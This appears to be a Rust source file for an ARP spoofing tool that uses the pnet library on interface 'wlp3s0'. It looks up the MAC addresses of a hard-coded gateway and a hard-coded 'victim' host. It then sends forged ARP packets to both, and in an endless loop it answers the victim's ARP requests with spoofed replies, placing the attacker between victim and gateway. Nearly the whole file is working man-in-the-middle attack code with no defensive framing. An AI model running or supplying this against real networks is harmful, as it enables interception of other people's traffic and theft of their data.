mod arp_packets;

extern crate core;

use std::net::{IpAddr, Ipv4Addr};
use std::time::Instant;
use pnet_datalink;
use pnet::packet::{self, MutablePacket, Packet};
use pnet::packet::arp::{ArpHardwareType, ArpHardwareTypes, ArpOperation, ArpOperations};
use pnet::packet::ethernet::{EtherType, EtherTypes};
use pnet::packet::ip::{IpNextHeaderProtocol, IpNextHeaderProtocols};
use pnet::packet::PacketSize;
use pnet::util::MacAddr;
use pnet_datalink::{Channel, DataLinkReceiver, DataLinkSender, NetworkInterface};

fn create_interface(interface_name: &str) -> NetworkInterface {
    pnet_datalink::interfaces().iter().find(|interface| {
        interface.name.eq(interface_name)
    }).expect(&format!("Interface {} could not be found", interface_name)).clone()
}

fn create_channels(network_interface: &NetworkInterface) -> (Box<dyn DataLinkSender>, Box<dyn DataLinkReceiver>) {
    let (tx, rx) = match pnet_datalink::channel(&network_interface, Default::default()) {
        Ok(Channel::Ethernet(rx, tx)) => (rx, tx),
        Ok(_) => panic!("unhandled channel type"),
        Err(e) => panic!("unable to create channel: {}", e),
    };
    (tx, rx)
}

fn get_local_ipv4_addr(network_interface: &NetworkInterface) -> Ipv4Addr {
    network_interface.ips.iter().find(|ip | {
        ip.ip().is_ipv4()
    }).map(|ip| match ip.ip() {
        IpAddr::V4(ip) => ip,
        _ => unreachable!(),
    }).expect("Unable to retrieve interface ipv4 address")
}

fn retrieve_mac_address(network_interface: &NetworkInterface, target_ip_addr: Ipv4Addr, tx: &mut dyn DataLinkSender, rx: &mut dyn DataLinkReceiver) -> Result<MacAddr, std::io::Error> {
    let sender_ip_addr = get_local_ipv4_addr(&network_interface);

    // send arp request for the target_ip_addr
    let packet = {
        let mut arp_packet = packet::arp::MutableArpPacket::owned(vec![0u8; packet::arp::ArpPacket::minimum_packet_size()]).unwrap();
        arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
        arp_packet.set_protocol_type(EtherTypes::Ipv4);
        arp_packet.set_hw_addr_len(6);
        arp_packet.set_proto_addr_len(4);
        arp_packet.set_operation(ArpOperations::Request);
        arp_packet.set_sender_hw_addr(network_interface.mac.unwrap());
        arp_packet.set_sender_proto_addr(sender_ip_addr);
        arp_packet.set_target_hw_addr(MacAddr::zero());
        arp_packet.set_target_proto_addr(target_ip_addr);

        let ethernet_packet_data = vec![0u8; packet::ethernet::EthernetPacket::minimum_packet_size() + arp_packet.packet_size()];
        let mut ethernet_packet = packet::ethernet::MutableEthernetPacket::owned(ethernet_packet_data).unwrap();
        ethernet_packet.set_destination(MacAddr::broadcast());
        ethernet_packet.set_source(network_interface.mac.unwrap());
        ethernet_packet.set_ethertype(packet::ethernet::EtherTypes::Arp);
        ethernet_packet.set_payload(arp_packet.packet_mut());

        ethernet_packet.packet().to_owned()
    };

    let process_next_packet = |rx: &mut dyn DataLinkReceiver| -> Option<MacAddr> {
        rx.next().ok().and_then(|incoming_packet| {
            packet::ethernet::EthernetPacket::owned(incoming_packet.to_owned())
        }).and_then(|ethernet_packet| {
            if ethernet_packet.get_ethertype() != EtherTypes::Arp {
                return None;
            }
            packet::arp::ArpPacket::owned(ethernet_packet.payload().to_owned())
        }).and_then(|arp_packet| {
            if arp_packet.get_operation() == ArpOperations::Reply && arp_packet.get_sender_proto_addr() == target_ip_addr {
                return Some(arp_packet.get_sender_hw_addr());
            }
            None
        })
    };

    // send an arp request packet, wait 5 sec for the response, if its unanswered send another arp request. Repeat this for a total of 10 arp request.
    // If the mac address could not be found return a timeout error.
    for _ in 0..10 {
        tx.send_to(&packet, None).expect("Could not send packet").expect("Packet sending failed");

        let start_time = Instant::now();
        loop {
            match process_next_packet(rx) {
                Some(addr) => return Ok(addr),
                None => {},
            }
            if start_time.elapsed().as_millis() > 5000 {
                break;
            }
        }
    }
    Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "Arp response timed out"))
}

fn send_arp_spoof_packets(network_interface: &NetworkInterface, tx: &mut dyn DataLinkSender, rx: &mut dyn DataLinkReceiver) {
    let gateway_ip_addr = Ipv4Addr::new(192,168,0,1);
    let gateway_mac_addr = retrieve_mac_address(&network_interface, gateway_ip_addr, tx, rx).expect("Could not locate gateway mac address");

    let victim_ip_addr = Ipv4Addr::new(192,168,0,65);
    let victim_mac_addr = retrieve_mac_address(&network_interface, victim_ip_addr, tx, rx).expect("Could not locate victim mac address");

    // send this arp packet to the gateway, telling it that its mac is now ours
    let packet = {
        let mut arp_packet = packet::arp::MutableArpPacket::owned(vec![0u8; packet::arp::ArpPacket::minimum_packet_size()]).unwrap();
        arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
        arp_packet.set_protocol_type(EtherTypes::Ipv4);
        arp_packet.set_hw_addr_len(6);
        arp_packet.set_proto_addr_len(4);
        arp_packet.set_operation(ArpOperations::Request);
        arp_packet.set_sender_hw_addr(network_interface.mac.unwrap());
        arp_packet.set_sender_proto_addr(victim_ip_addr);
        arp_packet.set_target_hw_addr(MacAddr::zero());
        arp_packet.set_target_proto_addr(victim_ip_addr);

        let ethernet_packet_data = vec![0u8; packet::ethernet::EthernetPacket::minimum_packet_size() + arp_packet.packet_size()];
        let mut ethernet_packet = packet::ethernet::MutableEthernetPacket::owned(ethernet_packet_data).unwrap();
        ethernet_packet.set_destination(gateway_mac_addr);
        ethernet_packet.set_source(network_interface.mac.unwrap());
        ethernet_packet.set_ethertype(packet::ethernet::EtherTypes::Arp);
        ethernet_packet.set_payload(arp_packet.packet_mut());

        ethernet_packet.packet().to_owned()
    };
    tx.send_to(&packet, None).expect("Could not send packet").expect("Packet sending failed");

    // send this packet to the victim, telling that the mac for the gateway is ours
    let packet = {
        let mut arp_packet = packet::arp::MutableArpPacket::owned(vec![0u8; packet::arp::ArpPacket::minimum_packet_size()]).unwrap();
        arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
        arp_packet.set_protocol_type(EtherTypes::Ipv4);
        arp_packet.set_hw_addr_len(6);
        arp_packet.set_proto_addr_len(4);
        arp_packet.set_operation(ArpOperations::Request);
        arp_packet.set_sender_hw_addr(network_interface.mac.unwrap());
        arp_packet.set_sender_proto_addr(gateway_ip_addr);
        arp_packet.set_target_hw_addr(MacAddr::zero());
        arp_packet.set_target_proto_addr(gateway_ip_addr);

        let ethernet_packet_data = vec![0u8; packet::ethernet::EthernetPacket::minimum_packet_size() + arp_packet.packet_size()];
        let mut ethernet_packet = packet::ethernet::MutableEthernetPacket::owned(ethernet_packet_data).unwrap();
        ethernet_packet.set_destination(victim_mac_addr);
        ethernet_packet.set_source(network_interface.mac.unwrap());
        ethernet_packet.set_ethertype(packet::ethernet::EtherTypes::Arp);
        ethernet_packet.set_payload(arp_packet.packet_mut());

        ethernet_packet.packet().to_owned()
    };
    tx.send_to(&packet, None).expect("Could not send packet").expect("Packet sending failed");

    let process_next_packet = |tx: &mut dyn DataLinkSender, rx: &mut dyn DataLinkReceiver| {
        rx.next().ok().and_then(|incoming_packet| {
            packet::ethernet::EthernetPacket::owned(incoming_packet.to_owned())
        }).and_then(|ethernet_packet| {
            if ethernet_packet.get_ethertype() != EtherTypes::Arp {
                return None;
            };
            packet::arp::ArpPacket::owned(ethernet_packet.payload().to_owned())
        }).and_then::<packet::arp::ArpPacket, _>(|arp_packet| {
            if arp_packet.get_sender_proto_addr() == victim_ip_addr && arp_packet.get_target_proto_addr() == gateway_ip_addr {
                let packet = {
                    let mut arp_packet = packet::arp::MutableArpPacket::owned(vec![0u8; packet::arp::ArpPacket::minimum_packet_size()]).unwrap();
                    arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
                    arp_packet.set_protocol_type(EtherTypes::Ipv4);
                    arp_packet.set_hw_addr_len(6);
                    arp_packet.set_proto_addr_len(4);
                    arp_packet.set_operation(ArpOperations::Reply);
                    arp_packet.set_sender_hw_addr(network_interface.mac.unwrap());
                    arp_packet.set_sender_proto_addr(gateway_ip_addr);
                    arp_packet.set_target_hw_addr(victim_mac_addr);
                    arp_packet.set_target_proto_addr(victim_ip_addr);

                    let ethernet_packet_data = vec![0u8; packet::ethernet::EthernetPacket::minimum_packet_size() + arp_packet.packet_size()];
                    let mut ethernet_packet = packet::ethernet::MutableEthernetPacket::owned(ethernet_packet_data).unwrap();
                    ethernet_packet.set_destination(victim_mac_addr);
                    ethernet_packet.set_source(network_interface.mac.unwrap());
                    ethernet_packet.set_ethertype(packet::ethernet::EtherTypes::Arp);
                    ethernet_packet.set_payload(arp_packet.packet_mut());

                    ethernet_packet.packet().to_owned()
                };
                tx.send_to(&packet, None).expect("Could not send packet").expect("Packet sending failed");
            }
            None
        });
    };

    loop {
        process_next_packet(tx, rx);
    }
}

fn main() {
    let interface = create_interface("wlp3s0");
    let (mut tx, mut rx) = create_channels(&interface);
    send_arp_spoof_packets(&interface, tx.as_mut(), rx.as_mut());
}
